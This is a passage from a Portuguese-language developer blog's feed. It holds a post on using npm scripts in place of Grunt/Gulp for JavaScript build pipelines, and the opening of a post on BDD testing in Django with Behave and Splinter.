para o &lt;em&gt;build&lt;/em&gt; de estáticos... &lt;em&gt;Frameworks&lt;/em&gt; como o &lt;em&gt;Django&lt;/em&gt; já possuíam um
&lt;em&gt;pipeline&lt;/em&gt; de concatenação e minificação, não sendo necessário que um …&lt;/p&gt;</summary><content type="html">&lt;p&gt;No meu primeiro contato com o &lt;em&gt;Grunt&lt;/em&gt;, ele não me convenceu. Qual era a
necessidade de um &lt;em&gt;task runner&lt;/em&gt; se eu já tinha o &lt;code&gt;Makefile&lt;/code&gt;? O mesmo valia
para o &lt;em&gt;build&lt;/em&gt; de estáticos... &lt;em&gt;Frameworks&lt;/em&gt; como o &lt;em&gt;Django&lt;/em&gt; já possuíam um
&lt;em&gt;pipeline&lt;/em&gt; de concatenação e minificação, não sendo necessário que um processo
externo interferisse em algo que (até então) funcionava muito bem.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Foi ao trabalhar com &lt;em&gt;Single Page Applications&lt;/em&gt; que o &lt;em&gt;Grunt&lt;/em&gt; me conquistou.
Coisas que iam da otimização de imagens a deploy para ambientes passaram a
ser responsabilidade da ferramenta, e a partir desse momento eu a carreguei
para todo projeto que participei.&lt;/p&gt;
&lt;p&gt;Mas o &lt;em&gt;Grunt&lt;/em&gt; não é "bala de prata". Se para determinados problemas ele funciona
muito bem, para outros ele representa um "peso" questionável na sua &lt;em&gt;stack&lt;/em&gt;. Aumentando
tempo de desenvolvimento (alguém aí já sofreu com o &lt;code&gt;grunt-contrib-watch&lt;/code&gt;?),
&lt;em&gt;build&lt;/em&gt; e &lt;em&gt;setup&lt;/em&gt; do seu ambiente.&lt;/p&gt;
&lt;p&gt;É baseado nesse contexto que &lt;a href="https://www.google.com.br/search?q=stop%20using%20grunt&amp;amp;oq=stop%20using%20grunt&amp;amp;aqs=chrome..69i57j0l5.1498j0j7&amp;amp;sourceid=chrome&amp;amp;es_sm=91&amp;amp;ie=UTF-8" title="Stop using Grunt"&gt;faço coro com alguns &lt;em&gt;developers&lt;/em&gt; espalhados por aí&lt;/a&gt;:
Talvez o seu projeto não precise do &lt;em&gt;Grunt&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;O que há de errado com o ele?&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Nada!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Grunt&lt;/em&gt;, &lt;em&gt;Gulp&lt;/em&gt;, &lt;em&gt;Brocolli&lt;/em&gt;, &lt;em&gt;Brunch&lt;/em&gt;, etc. são ferramentas super bacanas que
cumprem com louvor o seu objetivo. Só que assim como o &lt;em&gt;jQuery&lt;/em&gt;, para
determinados casos elas podem ser "too much".&lt;/p&gt;
&lt;p&gt;Assim como há uma frente defendendo o &lt;a href="http://www.codemag.com/article/1501101" title="Why Micro JavaScript Library Should Be Used in Your Next Application"&gt;uso de &lt;em&gt;microlibs&lt;/em&gt;&lt;/a&gt;
ao invés de &lt;em&gt;fat frameworks&lt;/em&gt;, há uma frente defendendo o uso do &lt;a href="http://www.sitepoint.com/guide-to-npm-as-a-build-tool/" title="Give Grunt the Boot! A Guide to Using npm as a Build Tool"&gt;&lt;em&gt;NPM&lt;/em&gt; como ferramenta de &lt;em&gt;build&lt;/em&gt;&lt;/a&gt;.
E por mais que possa parecer "&lt;a href="https://www.youtube.com/watch?v=tSUtPkJhvOU" title="Chora mais"&gt;mimimi&lt;/a&gt;",
alguns argumentos fazem certo sentido. Como por exemplo, o do
&lt;em&gt;Keith Cirkel&lt;/em&gt; no "&lt;a href="http://blog.keithcirkel.co.uk/why-we-should-stop-using-grunt/" title="Você deveria parar de usar Grunt"&gt;Why we should stop using Grunt &amp;amp; Gulp&lt;/a&gt;":&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;None of these build tools work without plugins. Just found an awesome new
tool which will revolutionise your build process? Great! Now just wait for
someone to write a wrapper for Grunt/Gulp/Brocolli, or write it yourself.
Rather than just learning the command line for the tool you want to use,
you now have to learn its programatic API, plus the API for your build tool.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;Flamewars&lt;/em&gt; e "discursos de ódio" à parte, a pergunta que fica é: Será que é tão difícil assim
montar um &lt;em&gt;pipeline&lt;/em&gt; de &lt;em&gt;build&lt;/em&gt; sem o uso de &lt;em&gt;Grunt&lt;/em&gt; e &lt;em&gt;Gulp&lt;/em&gt;?&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/king-baratheon.jpg" width="610" height="411" title="Nem todo mundo gosta de Javalis (br.ign.com)" alt="Nem todo mundo gosta de Javalis (br.ign.com)"&gt;&lt;/p&gt;
&lt;p&gt;Ter uma ferramenta a menos na &lt;em&gt;stack&lt;/em&gt; do projeto pode tornar-ser um diferencial
ao reduzir atrito e curva de aprendizado. Mas tirar o &lt;em&gt;Grunt&lt;/em&gt; da jogada não
significa necessariamente ter menos complexidade no seu projeto...
Apenas significa fazer a mesma coisa com uma dependência a menos.&lt;/p&gt;
&lt;h2&gt;NPM como ferramenta de build&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;&lt;a href="https://www.npmjs.com/package/livereload" title="LiveReload server"&gt;Livereload&lt;/a&gt;&lt;/em&gt;
é uma biblioteca escrita em &lt;em&gt;Node&lt;/em&gt; que levanta um servidor que monitora alterações
no seu projeto e promove um &lt;em&gt;refresh&lt;/em&gt; no navegador &lt;em&gt;web&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Podemos executá-lo através da linha de comando:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ livereload meuprojeto/static/css
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;É possível usar o &lt;code&gt;package.json&lt;/code&gt; como um "centralizador" de operações, assim
como fazemos com o nosso &lt;code&gt;Makefile&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ npm run livereload
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para tanto, no arquivo &lt;code&gt;package.json&lt;/code&gt;, precisamos adicionar a chave &lt;code&gt;scripts&lt;/code&gt;
com as instruções de execução para o comando &lt;code&gt;livereload&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// package.json&lt;/span&gt;

&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;scripts&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;livereload&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;livereload meuprojeto/static/css&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Talvez haja a necessidade da execução de um comando mais complexo. Para isso,
podemos utilizar um &lt;em&gt;script&lt;/em&gt; &lt;em&gt;Node&lt;/em&gt; como ajuda:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// build/livereload.js&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;livereload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;livereload&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;PATH_CSS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;meuprojeto/build/static/css&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;PATH_JS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;meuprojeto/build/static/js&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;livereload&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createServer&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="nx"&gt;server&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;watch&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nx"&gt;PATH_CSS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;PATH_JS&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E o nosso arquivo de configuração ficaria assim:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// package.json&lt;/span&gt;

&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;scripts&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;livereload&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;node buid/livereload&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vale lembrar que o &lt;code&gt;npm&lt;/code&gt; já possui alguns comandos padrões, que não necessitam
da instrução &lt;code&gt;run&lt;/code&gt;. Por exemplo, temos a execução de testes através do comando &lt;code&gt;npm test&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Um exemplo mais complexo&lt;/h3&gt;
&lt;p&gt;O exemplo acima é simples e questionável. Vamos partir de uma necessidade
mais palpável e complexa: Quero compilar componentes escritos em &lt;em&gt;React&lt;/em&gt; e &lt;em&gt;ES6&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para ilustrar, usaremos as bibliotecas &lt;em&gt;&lt;a href="https://facebook.github.io/react/" title="A Javascript library for building UI"&gt;React&lt;/a&gt;&lt;/em&gt;,
&lt;em&gt;&lt;a href="https://github.com/babel/babelify" title="Browserify transform for Babel"&gt;Babelify&lt;/a&gt;&lt;/em&gt; e
&lt;em&gt;&lt;a href="https://github.com/mishoo/UglifyJS2" title="JavaScript parser / mangler / compressor / beautifier toolkit"&gt;UglifyJS&lt;/a&gt;&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ npm install react --save
$ npm install babelify babel-preset-react babel-preset-es2015 uglify-js --save-dev
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos criar dois comandos diferentes na nossa chave &lt;code&gt;scripts&lt;/code&gt;, um para
&lt;em&gt;transpiling&lt;/em&gt; de &lt;em&gt;Javascript&lt;/em&gt; e outro para minificação:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// package.json&lt;/span&gt;

&lt;span class="s2"&gt;&amp;quot;compile-js&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;browserify meuprojeto/js/script.js -o meuprojeto/build/static/js/bundle.js -t [ babelify --presets [ es2015 react ] ]&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;

&lt;span class="s2"&gt;&amp;quot;minify-js&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;uglifyjs meuprojeto/build/static/js/bundle.js -o meuprojeto/build/static/js/bundle.min.js&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Grande demais? É possível isolar esses comandos em &lt;em&gt;scripts&lt;/em&gt;, como no exemplo do &lt;em&gt;livereload&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// package.json&lt;/span&gt;

&lt;span class="s2"&gt;&amp;quot;compile-js&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;node build/compile-js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;minify-js&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;node build/minify-js&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para tornar mais simples a execução, vamos criar uma &lt;em&gt;task&lt;/em&gt; genérica de &lt;em&gt;build&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// package.json&lt;/span&gt;

&lt;span class="s2"&gt;&amp;quot;compile-js&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;node build/compile-js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;minify-js&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;node build/minify-js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;build&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;npm run compile-js &amp;amp;&amp;amp; npm run minify-js&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Com uma ajudinha da &lt;em&gt;lib&lt;/em&gt; &lt;em&gt;&lt;a href="https://www.npmjs.com/package/watch" title="Utilities for watching file trees"&gt;Watch&lt;/a&gt;&lt;/em&gt;,
podemos incrementar ainda mais o nosso processo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// package.json&lt;/span&gt;

&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;scripts&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;compile-js&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;node build/compile-js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;minify-js&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;node build/minify-js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;build&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;npm run compile-js &amp;amp;&amp;amp; npm run minify-js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;watch&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;watch &amp;#39;npm run build&amp;#39; meuprojeto/static/js&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto! Agora temos os comandos &lt;code&gt;npm run build&lt;/code&gt; e &lt;code&gt;npm run watch&lt;/code&gt; que nos ajudarão na demanda
de "transpilar" e minificar componentes escritos em &lt;em&gt;React&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Não foi tããããão difícil assim... Certo? Bastou abrir a documentação de
cada ferramenta e perder alguns minutinhos lendo.&lt;/p&gt;
&lt;p&gt;"Mas você teve que escrever mais linhas que escreveria utilizando um &lt;em&gt;plugin&lt;/em&gt;
do &lt;em&gt;Grunt&lt;/em&gt;."&lt;/p&gt;
&lt;p&gt;Possivelmente. Bem como é possível que eu nunca mais vá mexer nessas linhas escritas,
uma vez que o processo já esteja montado e operacional.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;O mérito dos exemplos acima não está necessariamente na utilização do &lt;code&gt;npm&lt;/code&gt;
como ferramenta de &lt;em&gt;build&lt;/em&gt;, mas sim nos incríveis pacotes que a comunidade
&lt;em&gt;Javascript&lt;/em&gt; tem construído para agilizar a construção de aplicações.&lt;/p&gt;
&lt;p&gt;Ferramentas como o &lt;em&gt;Grunt&lt;/em&gt;, em seu tempo, fizeram uma revolução no que tange o
desenvolvimento de aplicações &lt;em&gt;web&lt;/em&gt; (e não há dúvida que ainda o fazem).
Mas com o advento do &lt;em&gt;webpack&lt;/em&gt;, &lt;em&gt;Browserify&lt;/em&gt; e &lt;em&gt;PostCSS&lt;/em&gt;,
o seu uso passou de essencial para opcional.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://addyosmani.com/blog/prosconsmicroframeworks/"&gt;Addy Osmani: The Pros And Cons Of JavaScript Micro-Frameworks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://engineering.hobsons.com/2015/06/26/build-tools-vs-npm-scripts-why-not-both/"&gt;Hobsons Engineering: Build Tools vs npm Scripts: Why Not Both?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@dabit3/introduction-to-using-npm-as-a-build-tool-b41076f488b0#.hc5o17p1p"&gt;Nader Dabit: Introduction to Using NPM as a Build Tool&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@nickheiner/maybe-you-should-stop-using-grunt-40ac57fd6ad9#.cpc7pdvwr"&gt;Nick Heiner: Maybe you should stop using Grunt&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.keithcirkel.co.uk/why-we-should-stop-using-grunt/"&gt;Keith Cirkel: Why we should stop using Grunt &amp;amp; Gulp&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://lucasmreis.github.io/blog/npm-is-an-amazing-build-tool/"&gt;Lucas M Reis: NPM is an amazing build tool (And solves 90% of the build issues)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.sitepoint.com/guide-to-npm-as-a-build-tool/"&gt;Sitepoint: Give Grunt the Boot! A Guide to Using npm as a Build Tool&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/28503800/grunt-is-extremely-slow-100-cpu"&gt;Stackoverflow: Grunt is extremely slow - 100% CPU&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/29244671/less-compiling-slow-with-grunt"&gt;Stackoverflow: Less compiling slow with Grunt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="javascript"></category><category term="node"></category><category term="npm"></category><category term="grunt"></category></entry><entry><title>BDD com Django e Behave</title><link href="https://klauslaube.com.br/2016/02/03/bdd-com-django-e-behave.html" rel="alternate"></link><published>2016-02-03T23:50:00-02:00</published><updated>2016-02-03T23:50:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2016-02-03:/2016/02/03/bdd-com-django-e-behave.html</id><summary type="html">&lt;p&gt;Testar o comportamento da sua aplicação, ao invés de pequenos módulos isolados,
é uma grande prática no que diz respeito a escrita de testes que guiem o
seu desenvolvimento.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Deixando a polêmica do "&lt;a href="http://david.heinemeierhansson.com/2014/tdd-is-dead-long-live-testing.html" title="TDD is dead. Long live testing."&gt;TDD is dead&lt;/a&gt;"
de lado, criar cenários que garantem um determinado fluxo, além de servir
como um …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Testar o comportamento da sua aplicação, ao invés de pequenos módulos isolados,
é uma grande prática no que diz respeito a escrita de testes que guiem o
seu desenvolvimento.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Deixando a polêmica do "&lt;a href="http://david.heinemeierhansson.com/2014/tdd-is-dead-long-live-testing.html" title="TDD is dead. Long live testing."&gt;TDD is dead&lt;/a&gt;"
de lado, criar cenários que garantem um determinado fluxo, além de servir
como um excelente contrato à sua suite de aceitação, é uma ótima ferramenta
para garantir que a integração &lt;em&gt;back-end/front-end&lt;/em&gt; está funcionando de acordo
com o esperado.&lt;/p&gt;
&lt;p&gt;Devo ser sincero com você, caro leitor: Fazer &lt;a href="https://klauslaube.com.br/tag/bdd.html" title="Leia mais sobre BDD"&gt;&lt;em&gt;BDD&lt;/em&gt;&lt;/a&gt;
com &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; (IMO) sempre foi uma dor de cabeça.
Já utilizei algumas ferramentas, como &lt;a href="https://klauslaube.com.br/2011/07/18/ferramentas-de-testes-em-django-parte-1.html"&gt;&lt;em&gt;unittest&lt;/em&gt;&lt;/a&gt;
focado em comportamento, &lt;a href="https://klauslaube.com.br/2011/07/18/ferramentas-de-testes-em-django-parte-1.html"&gt;&lt;em&gt;doctests&lt;/em&gt;&lt;/a&gt;,
&lt;a href="https://klauslaube.com.br/2011/07/23/ferramentas-de-testes-em-django-parte-2.html"&gt;&lt;em&gt;Lettuce&lt;/em&gt;&lt;/a&gt;, &lt;em&gt;Pycurracy&lt;/em&gt; e até mesmo &lt;em&gt;Jasmine&lt;/em&gt;...
Nada pareceu ser "o certo a se fazer".&lt;/p&gt;
&lt;p&gt;Recentemente esbarrei com um artigo ensinando a usar o &lt;a href="http://pythonhosted.org/behave/" title="BDD for Python"&gt;&lt;em&gt;Behave&lt;/em&gt;&lt;/a&gt;,
um &lt;em&gt;engine&lt;/em&gt; de testes &lt;em&gt;BDD&lt;/em&gt; para &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;...
E foi aí que a minha opinião mudou.&lt;/p&gt;
&lt;h2&gt;Oh, behave!&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Behave&lt;/em&gt; é uma biblioteca &lt;em&gt;Python&lt;/em&gt; que permite a escrita de &lt;em&gt;specs&lt;/em&gt; em linguagem humana,
e a execução dos cenários através de &lt;em&gt;asserts&lt;/em&gt; em "linguagem de programação". Agnóstico de &lt;em&gt;framework&lt;/em&gt;,
é um &lt;em&gt;engine&lt;/em&gt; promissor, &lt;a href="http://pythonhosted.org/behave/tutorial.html" title="Conheça o tutorial do Behave"&gt;fácil de usar&lt;/a&gt;,
e que possui uma boa comunidade dando suporte.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/oh-behave.jpg" width="480" height="415" title="Austin Powers: Oh behave (flickr.com)" alt="Austin Powers: Oh behave (flickr.com)"&gt;&lt;/p&gt;
&lt;p&gt;Você pode escrever a integração do &lt;em&gt;lib&lt;/em&gt; com o &lt;em&gt;Django&lt;/em&gt;, como demonstrado na &lt;a href="http://pythonhosted.org/behave/django.html" title="Exemplo de integração entre Behave e Django"&gt;documentação oficial&lt;/a&gt;.
Como eu sou preguiçoso, prefiro utilizar o módulo &lt;code&gt;behave-django&lt;/code&gt;,
criado por &lt;a href="https://github.com/mixxorz" title="Perfil do mixxorz no GitHub"&gt;Mitchel Cabuloy&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install behave-django
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Não podemos esquecer de colocá-lo no &lt;code&gt;INSTALLED_APPS&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;INSTALLED_APPS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;behave_django&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Agora basta criar uma estrutura na raíz do seu projeto (no mesmo nível do &lt;code&gt;manage.py&lt;/code&gt;), com a seguinte formação:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;features&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
    &lt;span class="n"&gt;steps&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
        &lt;span class="n"&gt;steps&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;
    &lt;span class="n"&gt;environment&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;
    &lt;span class="n"&gt;funcionalidade&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;feature&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos para um exemplo mais prático: &lt;em&gt;Eu quero que minha home exiba meu nome de usuário, caso eu esteja logado&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Começaremos pelo arquivo &lt;code&gt;.feature&lt;/code&gt;. Vou chamá-lo de &lt;code&gt;features/home-logada.feature&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;Feature&lt;/span&gt;: &lt;span class="nv"&gt;Logged&lt;/span&gt; &lt;span class="nv"&gt;in&lt;/span&gt; &lt;span class="nv"&gt;page&lt;/span&gt;

    &lt;span class="nv"&gt;Scenario&lt;/span&gt;: &lt;span class="nv"&gt;Access&lt;/span&gt; &lt;span class="nv"&gt;index&lt;/span&gt; &lt;span class="nv"&gt;page&lt;/span&gt;

        &lt;span class="nv"&gt;Given&lt;/span&gt; &lt;span class="nv"&gt;an&lt;/span&gt; &lt;span class="nv"&gt;authenticated&lt;/span&gt; &lt;span class="nv"&gt;user&lt;/span&gt;
        &lt;span class="nv"&gt;When&lt;/span&gt; &lt;span class="nv"&gt;I&lt;/span&gt; &lt;span class="nv"&gt;access&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;home&lt;/span&gt; &lt;span class="nv"&gt;page&lt;/span&gt;
        &lt;span class="k"&gt;Then&lt;/span&gt; &lt;span class="nv"&gt;I&lt;/span&gt; &lt;span class="nv"&gt;see&lt;/span&gt; &lt;span class="nv"&gt;my&lt;/span&gt; &lt;span class="nv"&gt;username&lt;/span&gt; &lt;span class="nv"&gt;printed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Já podemos executar o &lt;code&gt;behave&lt;/code&gt; através do &lt;code&gt;manage.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python manage.py behave
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Você verá uma saída sinalizando que nosso cenário está montado, mas
que ainda não há testes executando de fato.&lt;/p&gt;
&lt;p&gt;O arquivo de teste pode ter o nome que você desejar, o &lt;em&gt;Behave&lt;/em&gt; olhará
para cada ocorrência dentro de &lt;code&gt;steps/&lt;/code&gt; e coletará os passos que serão
usados para a execução das especificações.&lt;/p&gt;
&lt;p&gt;Mas antes de escrevermos os testes, vamos falar de uma ferramenta essencial
quando estamos fazendo testes de interface &lt;em&gt;web&lt;/em&gt; com &lt;em&gt;Python&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Splinter&lt;/h2&gt;
&lt;p&gt;Diretamente da &lt;a href="https://splinter.readthedocs.org/en/latest/" title="Documentação do Splinter"&gt;documentação oficial&lt;/a&gt; do &lt;em&gt;Splinter&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Splinter is an open source tool for testing web applications using Python. It lets you automate browser actions,
such as visiting URLs and interacting with their items.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A ferramenta fornece uma &lt;em&gt;API&lt;/em&gt; única para diferentes ferramentas de
